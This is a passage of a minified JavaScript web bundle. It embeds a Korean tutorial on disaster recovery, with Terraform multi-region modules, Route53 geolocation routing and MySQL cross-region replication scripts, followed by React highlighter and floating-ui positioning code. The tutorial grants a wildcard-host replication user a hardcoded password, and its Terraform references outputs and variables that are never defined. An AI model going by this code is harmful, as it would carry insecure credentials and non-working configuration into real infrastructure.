\`\`\``,checklist:["dr-plan.sh 스크립트 작성하고 DR 서버 정보 설정","AWS Route53에 도메인 등록 및 DNS 업데이트 테스트","dr-test.sh로 월간 DR 훈련 실행 (RTO/RPO 측정)","auto-failover.sh를 Cron에 등록 (* * * * *)","Primary 서버를 일부러 중단시켜 자동 페일오버 동작 확인"]},{subtitle:"3. Multi-Region 인프라 자동 복제",content:`Terraform을 사용해 여러 리전에 동일한 인프라를 자동으로 배포합니다.

**multi-region 구조**:
\`\`\`
terraform/
├── global/
│   ├── route53.tf        # 글로벌 DNS
│   └── s3-backend.tf     # Terraform 상태 저장소
├── regions/
│   ├── ap-northeast-2/   # 서울 (Primary)
│   ├── us-west-2/        # 오리건 (DR)
│   └── ap-southeast-1/   # 싱가포르 (CDN Edge)
└── modules/
    └── app-stack/        # 재사용 가능한 앱 스택
\`\`\`

**modules/app-stack/main.tf** (재사용 모듈):
\`\`\`hcl
variable "region" {
  type = string
}

variable "environment" {
  type = string
}

# Docker 네트워크
resource "docker_network" "app" {
  name = "\${var.environment}-app-network"
}

# MySQL
resource "docker_container" "mysql" {
  name  = "\${var.environment}-mysql"
  image = "mysql:8.0"

  env = [
    "MYSQL_ROOT_PASSWORD=\${var.mysql_password}",
    "MYSQL_DATABASE=\${var.db_name}"
  ]

  # 리전별 볼륨
  volumes {
    volume_name    = "\${var.environment}-mysql-data"
    container_path = "/var/lib/mysql"
  }

  networks_advanced {
    name = docker_network.app.name
  }
}

# 웹 앱
resource "docker_container" "web" {
  name  = "\${var.environment}-web"
  image = "myapp:\${var.app_version}"

  ports {
    internal = 3000
    external = 80
  }

  networks_advanced {
    name = docker_network.app.name
  }

  depends_on = [docker_container.mysql]
}

output "web_url" {
  value = "http://\${var.region}.example.com"
}
\`\`\`

**regions/ap-northeast-2/main.tf** (서울 리전):
\`\`\`hcl
module "seoul_stack" {
  source = "../../modules/app-stack"

  region      = "ap-northeast-2"
  environment = "seoul-prod"
  app_version = "v1.2.3"
  mysql_password = var.mysql_password
  db_name     = "myapp_seoul"
}

output "seoul_url" {
  value = module.seoul_stack.web_url
}
\`\`\`

**regions/us-west-2/main.tf** (오리건 DR):
\`\`\`hcl
module "oregon_stack" {
  source = "../../modules/app-stack"

  region      = "us-west-2"
  environment = "oregon-dr"
  app_version = "v1.2.3"
  mysql_password = var.mysql_password
  db_name     = "myapp_oregon"
}

output "oregon_url" {
  value = module.oregon_stack.web_url
}
\`\`\`

**global/route53.tf** (지리적 라우팅):
\`\`\`hcl
resource "aws_route53_zone" "main" {
  name = "example.com"
}

# 서울 리전 레코드
resource "aws_route53_record" "seoul" {
  zone_id = aws_route53_zone.main.zone_id
  name    = "app.example.com"
  type    = "A"
  ttl     = 60

  set_identifier = "Seoul"
  geolocation_routing_policy {
    continent = "AS"
  }

  records = [module.seoul_stack.public_ip]
}

# 오리건 리전 레코드
resource "aws_route53_record" "oregon" {
  zone_id = aws_route53_zone.main.zone_id
  name    = "app.example.com"
  type    = "A"
  ttl     = 60

  set_identifier = "Oregon"
  geolocation_routing_policy {
    continent = "NA"
  }

  records = [module.oregon_stack.public_ip]

  # Health Check 연동
  health_check_id = aws_route53_health_check.oregon.id
}

# Health Check
resource "aws_route53_health_check" "oregon" {
  fqdn              = module.oregon_stack.web_url
  port              = 80
  type              = "HTTP"
  resource_path     = "/health"
  failure_threshold = 3
  request_interval  = 30

  tags = {
    Name = "Oregon Health Check"
  }
}
\`\`\`

**전체 리전 배포 스크립트**:
\`\`\`bash
#!/bin/bash
# deploy-all-regions.sh

REGIONS=("ap-northeast-2" "us-west-2" "ap-southeast-1")

for REGION in "\${REGIONS[@]}"; do
  echo "🌏 Deploying to $REGION..."

  cd regions/$REGION
  terraform init
  terraform apply -auto-approve -var-file=../../environments/prod.tfvars

  # Health Check
  HEALTH_URL=$(terraform output -raw web_url)/health
  curl -f $HEALTH_URL || echo "⚠️  $REGION health check failed!"

  cd ../..
done

# 글로벌 DNS 업데이트
echo "🌐 Updating global DNS..."
cd global
terraform init
terraform apply -auto-approve

echo "✅ Multi-region deployment completed!"
\`\`\`

**데이터베이스 복제 (Primary → DR)**:
\`\`\`bash
#!/bin/bash
# db-replication.sh - 서울 → 오리건 실시간 복제

PRIMARY_DB="seoul-mysql"
DR_DB="oregon-mysql"

# Binary Log 기반 복제 설정
docker exec \${PRIMARY_DB} mysql -u root -p\${MYSQL_PASSWORD} -e "
  CREATE USER 'repl'@'%' IDENTIFIED BY 'repl_password';
  GRANT REPLICATION SLAVE ON *.* TO 'repl'@'%';
  FLUSH PRIVILEGES;
  SHOW MASTER STATUS;
"

# DR에서 복제 시작
MASTER_LOG_FILE=$(docker exec \${PRIMARY_DB} mysql -u root -p\${MYSQL_PASSWORD} -se "SHOW MASTER STATUS" | awk '{print $1}')
MASTER_LOG_POS=$(docker exec \${PRIMARY_DB} mysql -u root -p\${MYSQL_PASSWORD} -se "SHOW MASTER STATUS" | awk '{print $2}')

docker exec \${DR_DB} mysql -u root -p\${MYSQL_PASSWORD} -e "
  CHANGE MASTER TO
    MASTER_HOST='primary-server.example.com',
    MASTER_USER='repl',
    MASTER_PASSWORD='repl_password',
    MASTER_LOG_FILE='\${MASTER_LOG_FILE}',
    MASTER_LOG_POS=\${MASTER_LOG_POS};
  START SLAVE;
  SHOW SLAVE STATUS\\G;
"

echo "✅ Cross-region replication configured!"
\`\`\``,checklist:["modules/app-stack/ 디렉토리에 재사용 가능한 모듈 작성","3개 리전(서울/오리건/싱가포르)에 각각 스택 배포","Route53에서 Geolocation 라우팅 설정 (아시아→서울, 미국→오리건)","db-replication.sh로 서울→오리건 DB 실시간 복제 설정","VPN으로 미국 IP 사용해서 오리건 서버로 라우팅되는지 확인"]}]}}}]}]},d0=({size:o=24})=>f.jsxs("svg",{xmlns:"http://www.w3.org/2000/svg",width:o,height:o,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[f.jsx("path",{d:"m9 11-6 6v3h9l3-3"}),f.jsx("path",{d:"m22 12-4.6 4.6a2 2 0 0 1-2.8 0l-5.2-5.2a2 2 0 0 1 0-2.8L14 4"})]}),f0=({size:o=24})=>f.jsxs("svg",{xmlns:"http://www.w3.org/2000/svg",width:o,height:o,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[f.jsx("line",{x1:"18",y1:"6",x2:"6",y2:"18"}),f.jsx("line",{x1:"6",y1:"6",x2:"18",y2:"18"})]});function m0({isActive:o,onToggle:u}){return f.jsx("button",{onClick:u,className:`
        fixed bottom-6 right-6 w-14 h-14 rounded-full shadow-lg z-50
        flex items-center justify-center
        transition-all duration-200
        ${o?"bg-red-600 hover:bg-red-700 rotate-90":"bg-indigo-600 hover:bg-indigo-700"}
        text-white
        hover:scale-110
        active:scale-95
      `,"aria-label":o?"하이라이터 모드 끄기":"하이라이터 모드 켜기",title:o?"하이라이터 모드 끄기 (클릭)":"하이라이터 모드 켜기 (클릭)",children:o?f.jsx(f0,{size:24}):f.jsx(d0,{size:24})})}function p0(){const o=window.getSelection();return o?o.toString().trim():""}function h0(){const o=window.getSelection();return!o||o.rangeCount===0?null:o.getRangeAt(0).getBoundingClientRect()}function g0({isActive:o,onTextSelected:u}){const m=se.useRef(null);return se.useEffect(()=>{if(!o)return;const r=()=>{m.current&&clearTimeout(m.current),m.current=setTimeout(()=>{const x=p0();if(console.log("[TextSelection] Selected text:",x),!x||x.length<2){console.log("[TextSelection] Text too short or empty");return}const L=h0();if(console.log("[TextSelection] Selection rect:",L),!L){console.log("[TextSelection] No bounding rect");return}u({text:x,rect:L})},100)},v=x=>{x.preventDefault()},R=()=>{console.log("[TextSelection] Mouse/Touch up detected"),r()};return document.addEventListener("mouseup",R),document.addEventListener("touchend",R),document.addEventListener("contextmenu",v),()=>{m.current&&clearTimeout(m.current),document.removeEventListener("mouseup",R),document.removeEventListener("touchend",R),document.removeEventListener("contextmenu",v)}},[o,u]),null}const li=Math.min,Wa=Math.max,si=Math.round,ai=Math.floor,zt=o=>({x:o,y:o}),y0={left:"right",right:"left",bottom:"top",top:"bottom"},v0={start:"end",end:"start"};function om(o,u,m){return Wa(o,li(u,m))}function ri(o,u){return typeof o=="function"?o(u):o}function Ja(o){return o.split("-")[0]}function ui(o){return o.split("-")[1]}function Sm(o){return o==="x"?"y":"x"}function bm(o){return o==="y"?"height":"width"}const S0=new Set(["top","bottom"]);function Da(o){return S0.has(Ja(o))?"y":"x"}function Em(o){return Sm(Da(o))}function b0(o,u,m){m===void 0&&(m=!1);const r=ui(o),v=Em(o),R=bm(v);let x=v==="x"?r===(m?"end":"start")?"right":"left":r==="start"?"bottom":"top";return u.reference[R]>u.floating[R]&&(x=ii(x)),[x,ii(x)]}function E0(o){const u=ii(o);return[Qc(o),u,Qc(u)]}function Qc(o){return o.replace(/start|end/g,u=>v0[u])}const cm=["left","right"],rm=["right","left"],T0=["top","bottom"],_0=["bottom","top"];function R0(o,u,m){switch(o){case"top":case"bottom":return m?u?rm:cm:u?cm:rm;case"left":case"right":return u?T0:_0;default:return[]}}function A0(o,u,m,r){const v=ui(o);let R=R0(Ja(o),m==="start",r);return v&&(R=R.map(x=>x+"-"+v),u&&(R=R.concat(R.map(Qc)))),R}function ii(o){return o.replace(/left|right|bottom|top/g,u=>y0[u])}function x0(o){return{top:0,right:0,bottom:0,left:0,...o}}function C0(o){return typeof o!="number"?x0(o):{top:o,right:o,bottom:o,left:o}}function oi(o){const{x:u,y:m,width:r,height:v}=o;return{width:r,height:v,top:m,left:u,right:u+r,bottom:m+v,x:u,y:m}}function um(o,u,m){let{reference:r,floating:v}=o;const R=Da(u),x=Em(u),L=bm(x),C=Ja(u),g=R==="y",k=r.x+r.width/2-v.width/2,O=r.y+r.height/2-v.height/2,q=r[L]/2-v[L]/2;let j;switch(C){case"top":j={x:k,y:r.y-v.height};break;case"bottom":j={x:k,y:r.y+r.height};break;case"right":j={x:r.x+r.width,y:O};break;case"left":j={x:r.x-v.width,y:O};break;default:j={x:r.x,y:r.y}}switch(ui(u)){case"start":j[x]-=q*(m&&g?-1:1);break;case"end":j[x]+=q*(m&&g?-1:1);break}return j}const O0=async(o,u,m)=>{const{placement:r="bottom",strategy:v="absolute",middleware:R=[],platform:x}=m,L=R.filter(Boolean),C=await(x.isRTL==null?void 0:x.isRTL(u));let g=await x.getElementRects({reference:o,floating:u,strategy:v}),{x:k,y:O}=um(g,r,C),q=r,j={},K=0;for(let $=0;$<L.length;$++){const{name:ae,fn:W}=L[$],{x:ne,y:P,data:ie,reset:le}=await W({x:k,y:O,initialPlacement:r,placement:q,strategy:v,middlewareData:j,rects:g,platform:x,elements:{reference:o,floating:u}});k=ne??k,O=P??O,j={...j,[ae]:{...j[ae],...ie}},le&&K<=50&&(K++,typeof le=="object"&&(le.placement&&(q=le.placement),le.rects&&(g=le.rects===!0?await x.getElementRects({reference:o,floating:u,strategy:v}):le.rects),{x:k,y:O}=um(g,q,C)),$=-1)}return{x:k,y:O,placement:q,strategy:v,middlewareData:j}};async function Tm(o,u){var m;u===void 0&&(u={});const{x:r,y:v,platform:R,rects:x,elements:L,strategy:C}=o,{boundary:g="clippingAncestors",rootBoundary:k="viewport",elementContext:O="floating",altBoundary:q=!1,padding:j=0}=ri(u,o),K=C0(j),ae=L[q?O==="floating"?"reference":"floating":O],W=oi(await R.getClippingRect({element:(m=await(R.isElement==null?void 0:R.isElement(ae)))==null||m?ae:ae.contextElement||await(R.getDocumentElement==null?void 0:R.getDocumentElement(L.floating)),boundary:g,rootBoundary:k,strategy:C})),ne=O==="floating"?{x:r,y:v,width:x.floating.width,height:x.floating.height}:x.reference,P=await(R.getOffsetParent==null?void 0:R.getOffsetParent(L.floating)),ie=await(R.isElement==null?void 0:R.isElement(P))?await(R.getScale==null?void 0:R.getScale(P))||{x:1,y:1}:{x:1,y:1},le=oi(R.convertOffsetParentRelativeRectToViewportRelativeRect?await R.convertOffsetParentRelativeRectToViewportRelativeRect({elements:L,rect:ne,offsetParent:P,strategy:C}):ne);return{top:(W.top-le.top+K.top)/ie.y,bottom:(le.bottom-W.bottom+K.bottom)/ie.y,left:(W.left-le.left+K.left)/ie.x,right:(le.right-W.right+K.right)/ie.x}}const D0=function(o){return o===void 0&&(o={}),{name:"flip",options:o,async fn(u){var m,r;const{placement:v,middlewareData:R,rects:x,initialPlacement:L,platform:C,elements:g}=u,{mainAxis:k=!0,crossAxis:O=!0,fallbackPlacements:q,fallbackStrategy:j="bestFit",fallbackAxisSideDirection:K="none",flipAlignment:$=!0,...ae}=ri(o,u);if((m=R.arrow)!=null&&m.alignmentOffset)return{};const W=Ja(v),ne=Da(L),P=Ja(L)===L,ie=await(C.isRTL==null?void 0:C.isRTL(g.floating)),le=q||(P||!$?[ii(L)]:E0(L)),ge=K!=="none";!q&&ge&&le.push(...A0(L,$,K,ie));const I=[L,...le],_e=await Tm(u,ae),Ne=[];let He=((r=R.flip)==null?void 0:r.overflows)||[];if(k&&Ne.push(_e[W]),O){const De=b0(v,x,ie);Ne.push(_e[De[0]],_e[De[1]])}if(He=[...He,{placement:v,overflows:Ne}],!Ne.every(De=>De<=0)){var Ge,Re;const De=(((Ge=R.flip)==null?void 0:Ge.index)||0)+1,qe=I[De];if(qe&&(!(O==="alignment"?ne!==Da(qe):!1)||He.every(H=>Da(H.placement)===ne?H.overflows[0]>0:!0)))return{data:{index:De,overflows:He},reset:{placement:qe}};let A=(Re=He.filter(z=>z.overflows[0]<=0).sort((z,H)=>z.overflows[1]-H.overflows[1])[0])==null?void 0:Re.placement;if(!A)switch(j){case"bestFit":{var Ke;const z=(Ke=He.filter(H=>{if(ge){const N=Da(H.placement);return N===ne||N==="y"}return!0}).map(H=>[H.placement,H.overflows.filter(N=>N>0).reduce((N,U)=>N+U,0)]).sort((H,N)=>H[1]-N[1])[0])==null?void 0:Ke[0];z&&(A=z);break}case"initialPlacement":A=L;break}if(v!==A)return{reset:{placement:A}}}return{}}}},k0=new Set(["left","top"]);async function w0(o,u){const{placement:m,platform:r,elements:v}=o,R=await(r.isRTL==null?void 0:r.isRTL(v.floating)),x=Ja(m),L=ui(m),C=Da(m)==="y",g=k0.has(x)?-1:1,k=R&&C?-1:1,O=ri(u,o);let{mainAxis:q,crossAxis:j,alignmentAxis:K}=typeof O=="number"?{mainAxis:O,crossAxis:0,alignmentAxis:null}:{mainAxis:O.mainAxis||0,crossAxis:O.crossAxis||0,alignmentAxis:O.alignmentAxis};return L&&typeof K=="number"&&(j=L==="end"?K*-1:K),C?{x:j*k,y:q*g}:{x:q*g,y:j*k}}const M0=function(o){return o===void 0&&(o=0),{name:"offset",options:o,async fn(u){var m,r;const{x:v,y:R,placement:x,middlewareData:L}=u,C=await w0(u,o);return x===((m=L.offset)==null?void 0:m.placement)&&(r=L.arrow)!=null&&r.alignmentOffset?{}:{x:v+C.x,y:R+C.y,data:{...C,placement:x}}}}},L0=function(o){return o===void 0&&(o={}),{name:"shift",options:o,async fn(u){const{x:m,y:r,placement:v}=u,{mainAxis:R=!0,crossAxis:x=!1,limiter:L={fn:ae=>{let{x:W,y:ne}=ae;return{x:W,y:ne}}},...C}=ri(o,u),g={x:m,y:r},k=await Tm(u,C),O=Da(Ja(v)),q=Sm(O);let j=g[q],K=g[O];if(R){const ae=q==="y"?"top":"left",W=q==="y"?"bottom":"right",ne=j+k[ae],P=j-k[W];j=om(ne,j,P)}if(x){const ae=O==="y"?"top":"left",W=O==="y"?"bottom":"right",ne=K+k[ae],P=K-k[W];K=om(ne,K,P)}const $=L.fn({...u,[q]:j,[O]:K});return{...$,data:{x:$.x-m,y:$.y-r,enabled:{[q]:R,[O]:x}}}}}};function di(){return typeof window<"u"}function Hn(o){return _m(o)?(o.nodeName||"").toLowerCase():"#document"}function yt(o){var u;return(o==null||(u=o.ownerDocument)==null?void 0:u.defaultView)||window}function jt(o){var u;return(u=(_m(o)?o.ownerDocument:o.document)||window.document)==null?void 0:u.documentElement}function _m(o){return di()?o instanceof Node||o instanceof yt(o).Node:!1}function wt(o){return di()?o instanceof Element||o instanceof yt(o).Element:!1}function Bt(o){return di()?o instanceof HTMLElement||o instanceof yt(o).HTMLElement:!1}function dm(o){return!di()||typeof ShadowRoot>"u"?!1:o instanceof ShadowRoot||o instanceof yt(o).ShadowRoot}const N0=new Set(["inline","contents"]);function zl(o){const{overflow:u,overflowX:m,overflowY:r,display:v}=Mt(o);return/auto|scroll|overlay|hidden|clip/.test(u+r+m)&&!N0.has(v)}const q0=new Set(["table","td","th"]);function U0(o){return q0.has(Hn(o))}const z0=[":popover-open",":modal"];function fi(o){return z0.some(u=>{try{return o.matches(u)}catch{return!1}})}const B0=["transform","translate","scale","rotate","perspective"],j0=["transform","translate","scale","rotate","perspective","filter"],H0=["paint","layout","strict","content"];function Vc(o){const u=Xc(),m=wt(o)?Mt(o):o;return B0.some(r=>m[r]?m[r]!=="none":!1)||(m.containerType?m.containerType!=="normal":!1)||!u&&(m.backdropFilter?m.backdropFilter!=="none":!1)||!u&&(m.filter?m.filter!=="none":!1)||j0.some(r=>(m.willChange||"").includes(r))||H0.some(r=>(m.contain||"").includes(r))}function G0(o){let u=ka(o);for(;Bt(u)&&!jn(u);){if(Vc(u))return u;if(fi(u))return null;u=ka(u)}return null}function Xc(){return typeof CSS>"u"||!CSS.supports?!1:CSS.supports("-webkit-backdrop-filter","none")}const Q0=new Set(["html","body","#document"]);function jn(o){return Q0.has(Hn(o))}function Mt(o){return yt(o).getComputedStyle(o)}function mi(o){return wt(o)?{scrollLeft:o.scrollLeft,scrollTop:o.scrollTop}:{scrollLeft:o.scrollX,scrollTop:o.scrollY}}function ka(o){if(Hn(o)==="html")return o;const u=o.assignedSlot||o.parentNode||dm(o)&&o.host||jt(o);return dm(u)?u.host:u}function Rm(o){const u=ka(o);return jn(u)?o.ownerDocument?o.ownerDocument.body:o.body:Bt(u)&&zl(u)?u:Rm(u)}function Ul(o,u,m){var r;u===void 0&&(u=[]),m===void 0&&(m=!0);const v=Rm(o),R=v===((r=o.ownerDocument)==null?void 0:r.body),x=yt(v);if(R){const L=Yc(x);return u.concat(x,x.visualViewport||[],zl(v)?v:[],L&&m?Ul(L):[])}return u.concat(v,Ul(v,[],m))}function Yc(o){return o.parent&&Object.getPrototypeOf(o.parent)?o.frameElement:null}function Am(o){const u=Mt(o);let m=parseFloat(u.width)||0,r=parseFloat(u.height)||0;const v=Bt(o),R=v?o.offsetWidth:m,x=v?o.offsetHeight:r,L=si(m)!==R||si(r)!==x;return L&&(m=R,r=x),{width:m,height:r,$:L}}function Ic(o){return wt(o)?o:o.contextElement}function Bn(o){const u=Ic(o);if(!Bt(u))return zt(1);const m=u.getBoundingClientRect(),{width:r,height:v,$:R}=Am(u);let x=(R?si(m.width):m.width)/r,L=(R?si(m.height):m.height)/v;return(!x||!Number.isFinite(x))&&(x=1),(!L||!Number.isFinite(L))&&(L=1),{x,y:L}}const Y0=zt(0);function xm(o){const u=yt(o);return!Xc()||!u.visualViewport?Y0:{x:u.visualViewport.offsetLeft,y:u.visualViewport.offsetTop}}function K0(o,u,m){return u===void 0&&(u=!1),!m||u&&m!==yt(o)?!1:u}function Pa(o,u,m,r){u===void 0&&(u=!1),m===void 0&&(m=!1);const v=o.getBoundingClientRect(),R=Ic(o);let x=zt(1);u&&(r?wt(r)&&(x=Bn(r)):x=Bn(o));const L=K0(R,m,r)?xm(R):zt(0);let C=(v.left+L.x)/x.x,g=(v.top+L.y)/x.y,k=v.width/x.x,O=v.height/x.y;if(R){const q=yt(R),j=r&&wt(r)?yt(r):r;let K=q,$=Yc(K);for(;$&&r&&j!==K;){const ae=Bn($),W=$.getBoundingClientRect(),ne=Mt($),P=W.left+($.clientLeft+parseFloat(ne.paddingLeft))*ae.x,ie=W.top+($.clientTop+parseFloat(ne.paddingTop))*ae.y;C*=ae.x,g*=ae.y,k*=ae.x,O*=ae.y,C+=P,g+=ie,K=yt($),$=Yc(K)}}return oi({width:k,height:O,x:C,y:g})}function pi(o,u){const m=mi(o).scrollLeft;return u?u.left+m:Pa(jt(o)).left+m}function Cm(o,u){const m=o.getBoundingClientRect(),r=m.left+u.scrollLeft-pi(o,m),v=m.top+u.scrollTop;return{x:r,y:v}}function V0(o){let{elements:u,rect:m,offsetParent:r,strategy:v}=o;const R=v==="fixed",x=jt(r),L=u?fi(u.floating):!1;if(r===x||L&&R)return m;let C={scrollLeft:0,scrollTop:0},g=zt(1);const k=zt(0),O=Bt(r);if((O||!O&&!R)&&((Hn(r)!=="body"||zl(x))&&(C=mi(r)),Bt(r))){const j=Pa(r);g=Bn(r),k.x=j.x+r.clientLeft,k.y=j.y+r.clientTop}const q=x&&!O&&!R?Cm(x,C):zt(0);return{width:m.width*g.x,height:m.height*g.y,x:m.x*g.x-C.scrollLeft*g.x+k.x+q.x,y:m.y*g.y-C.scrollTop*g.y+k.y+q.y}}function X0(o){return Array.from(o.getClientRects())}function I0(o){const u=jt(o),m=mi(o),r=o.ownerDocument.body,v=Wa(u.scrollWidth,u.clientWidth,r.scrollWidth,r.clientWidth),R=Wa(u.scrollHeight,u.clientHeight,r.scrollHeight,r.clientHeight);let x=-m.scrollLeft+pi(o);const L=-m.scrollTop;return Mt(r).direction==="rtl"&&(x+=Wa(u.clientWidth,r.clientWidth)-v),{width:v,height:R,x,y:L}}const fm=25;function Z0(o,u){const m=yt(o),r=jt(o),v=m.visualViewport;let R=r.clientWidth,x=r.clientHeight,L=0,C=0;if(v){R=v.width,x=v.height;const k=Xc();(!k||k&&u==="fixed")&&(L=v.offsetLeft,C=v.offsetTop)}const g=pi(r);if(g<=0){const k=r.ownerDocument,O=k.body,q=getComputedStyle(O),j=k.compatMode==="CSS1Compat"&&parseFloat(q.marginLeft)+parseFloat(q.marginRight)||0,K=Math.abs(r.clientWidth-O.clientWidth-j);K<=fm&&(R-=K)}else g<=fm&&(R+=g);return{width:R,height:x,x:L,y:C}}const $0=new Set(["absolute","fixed"]);function W0(o,u){const m=Pa(o,!0,u==="fixed"),r=m.top+o.clientTop,v=m.left+o.clientLeft,R=Bt(o)?Bn(o):zt(1),x=o.clientWidth*R.x,L=o.clientHeight*R.y,C=v*R.x,g=r*R.y;return{width:x,height:L,x:C,y:g}}function mm(o,u,m){let r;if(u==="viewport")r=Z0(o,m);else if(u==="document")r=I0(jt(o));else if(wt(u))r=W0(u,m);else{const v=xm(o);r={x:u.x-v.x,y:u.y-v.y,width:u.width,height:u.height}}return oi(r)}function Om(o,u){const m=ka(o);return m===u||!wt(m)||jn(m)?!1:Mt(m).position==="fixed"||Om(m,u)}function J0(o,u){const m=u.get(o);if(m)return m;let r=Ul(o,[],!1).filter(L=>wt(L)&&Hn(L)!=="body"),v=null;const R=Mt(o).position==="fixed";let x=R?ka(o):o;for(;wt(x)&&!jn(x);){const L=Mt(x),C=Vc(x);!C&&L.position==="fixed"&&(v=null),(R?!C&&!v:!C&&L.position==="static"&&!!v&&$0.has(v.position)||zl(x)&&!C&&Om(o,x))?r=r.filter(k=>k!==x):v=L,x=ka(x)}return u.set(o,r),r}function P0(o){let{element:u,boundary:m,rootBoundary:r,strategy:v}=o;const x=[...m==="clippingAncestors"?fi(u)?[]:J0(u,this._c):[].concat(m),r],L=x[0],C=x.reduce((g,k)=>{const O=mm(u,k,v);return g.top=Wa(O.top,g.top),g.right=li(O.right,g.right),g.bottom=li(O.bottom,g.bottom),g.left=Wa(O.left,g.left),g},mm(u,L,v));return{width:C.right-C.left,height:C.bottom-C.top,x:C.left,y:C.top}}function F0(o){const{width:u,height:m}=Am(o);return{width:u,height:m}}function eg(o,u,m){const r=Bt(u),v=jt(u),R=m==="fixed",x=Pa(o,!0,R,u);let L={scrollLeft:0,scrollTop:0};const C=zt(0);function g(){C.x=pi(v)}if(r||!r&&!R)if((Hn(u)!=="body"||zl(v))&&(L=mi(u)),r){const j=Pa(u,!0,R,u);C.x=j.x+u.clientLeft,C.y=j.y+u.clientTop}else v&&g();R&&!r&&v&&g();const k=v&&!r&&!R?Cm(v,L):zt(0),O=x.left+L.scrollLeft-C.x-k.x,q=x.top+L.scrollTop-C.y-k.y;return{x:O,y:q,width:x.width,height:x.height}}function Hc(o){return Mt(o).position==="static"}function pm(o,u){if(!Bt(o)||Mt(o).position==="fixed")return null;if(u)return u(o);let m=o.offsetParent;return jt(o)===m&&(m=m.ownerDocument.body),m}function Dm(o,u){const m=yt(o);if(fi(o))return m;if(!Bt(o)){let v=ka(o);for(;v&&!jn(v);){if(wt(v)&&!Hc(v))return v;v=ka(v)}return m}let r=pm(o,u);for(;r&&U0(r)&&Hc(r);)r=pm(r,u);return r&&jn(r)&&Hc(r)&&!Vc(r)?m:r||G0(o)||m}const tg=async function(o){const u=this.getOffsetParent||Dm,m=this.getDimensions,r=await m(o.floating);return{reference:eg(o.reference,await u(o.floating),o.strategy),floating:{x:0,y:0,width:r.width,height:r.height}}};function ag(o){return Mt(o).direction==="rtl"}const ng={convertOffsetParentRelativeRectToViewportRelativeRect:V0,getDocumentElement:jt,getClippingRect:P0,getOffsetParent:Dm,getElementRects:tg,getClientRects:X0,getDimensions:F0,getScale:Bn,isElement:wt,isRTL:ag};function km(o,u){return o.x===u.x&&o.y===u.y&&o.width===u.width&&o.height===u.height}function lg(o,u){let m=null,r;const v=jt(o);function R(){var L;clearTimeout(r),(L=m)==null||L.disconnect(),m=null}function x(L,C){L===void 0&&(L=!1),C===void 0&&(C=1),R();const g=o.getBoundingClientRect(),{left:k,top:O,width:q,height:j}=g;if(L||u(),!q||!j)return;const K=ai(O),$=ai(v.clientWidth-(k+q)),ae=ai(v.clientHeight-(O+j)),W=ai(k),P={rootMargin:-K+"px "+-$+"px "+-ae+"px "+-W+"px",threshold:Wa(0,li(1,C))||1};let ie=!0;function le(ge){const I=ge[0].intersectionRatio;if(I!==C){if(!ie)return x();I?x(!1,I):r=setTimeout(()=>{x(!1,1e-7)},1e3)}I===1&&!km(g,o.getBoundingClientRect())&&x(),ie=!1}try{m=new IntersectionObserver(le,{...P,root:v.ownerDocument})}catch{m=new IntersectionObserver(le,P)}m.observe(o)}return x(!0),R}function sg(o,u,m,r){r===void 0&&(r={});const{ancestorScroll:v=!0,ancestorResize:R=!0,elementResize:x=typeof ResizeObserver=="function",layoutShift:L=typeof IntersectionObserver=="function",animationFrame:C=!1}=r,g=Ic(o),k=v||R?[...g?Ul(g):[],...Ul(u)]:[];k.forEach(W=>{v&&W.addEventListener("scroll",m,{passive:!0}),R&&W.addEventListener("resize",m)});const O=g&&L?lg(g,m):null;let q=-1,j=null;x&&(j=new ResizeObserver(W=>{let[ne]=W;ne&&ne.target===g&&j&&(j.unobserve(u),cancelAnimationFrame(q),q=requestAnimationFrame(()=>{var P;(P=j)==null||P.observe(u)})),m()}),g&&!C&&j.observe(g),j.observe(u));let K,$=C?Pa(o):null;C&&ae();function ae(){const W=Pa(o);$&&!km($,W)&&m(),$=W,K=requestAnimationFrame(ae)}return m(),()=>{var W;k.forEach(ne=>{v&&ne.removeEventListener("scroll",m),R&&ne.removeEventListener("resize",m)}),O?.(),(W=j)==null||W.disconnect(),j=null,C&&cancelAnimationFrame(K)}}const ig=M0,og=L0,cg=D0,rg=(o,u,m)=>{const r=new Map,v={platform:ng,...m},R={...v.platform,_c:r};return O0(o,u,{...v,platform:R})};var ug=vm(),dg=typeof document<"u",fg=function(){},ni=dg?se.useLayoutEffect:fg;function ci(o,u){if(o===u)return!0;if(typeof o!=typeof u)return!1;if(typeof o=="function"&&o.toString()===u.toString())return!0;let m,r,v;if(o&&u&&typeof o=="object"){if(Array.isArray(o)){if(m=o.length,m!==u.length)return!1;for(r=m;r--!==0;)if(!ci(o[r],u[r]))return!1;return!0}if(v=Object.keys(o),m=v.length,m!==Object.keys(u).length)return!1;for(r=m;r--!==0;)if(!{}.hasOwnProperty.call(u,v[r]))return!1;for(r=m;r--!==0;){const R=v[r];if(!(R==="_owner"&&o.$$typeof)&&!ci(o[R],u[R]))return!1}return!0}return o!==o&&u!==u}function wm(o){return typeof window>"u"?1:(o.ownerDocument.defaultView||window).devicePixelRatio||1}function hm(o,u){const m=wm(o);return Math.round(u*m)/m}function Gc(o){const u=se.useRef(o);return ni(()=>{u.current=o}),u}function mg(o){o===void 0&&(o={});const{placement:u="bottom",strategy:m="absolute",middleware:r=[],platform:v,elements:{reference:R,floating:x}={},transform:L=!0,whileElementsMounted:C,open:g}=o,[k,O]=se.useState({x:0,y:0,strategy:m,placement:u,middlewareData:{},isPositioned:!1}),[q,j]=se.useState(r);ci(q,r)||j(r);const[K,$]=se.useState(null),[ae,W]=se.useState(null),ne=se.useCallback(H=>{H!==ge.current&&(ge.current=H,$(H))},[]),P=se.useCallback(H=>{H!==I.current&&(I.current=H,W(H))},[]),ie=R||K,le=x||ae,ge=se.useRef(null),I=se.useRef(null),_e=se.useRef(k),Ne=C!=null,He=Gc(C),Ge=Gc(v),Re=Gc(g),Ke=se.useCallback(()=>{if(!ge.current||!I.current)return;const H={placement:u,strategy:m,middleware:q};Ge.current&&(H.platform=Ge.current),rg(ge.current,I.current,H).then(N=>{const U={...N,isPositioned:Re.current!==!1};De.current&&!ci(_e.current,U)&&(_e.current=U,ug.flushSync(()=>{O(U)}))})},[q,u,m,Ge,Re]);ni(()=>{g===!1&&_e.current.isPositioned&&(_e.current.isPositioned=!1,O(H=>({...H,isPositioned:!1})))},[g]);const De=se.useRef(!1);ni(()=>(De.current=!0,()=>{De.current=!1}),[]),ni(()=>{if(ie&&(ge.current=ie),le&&(I.current=le),ie&&le){if(He.current)return 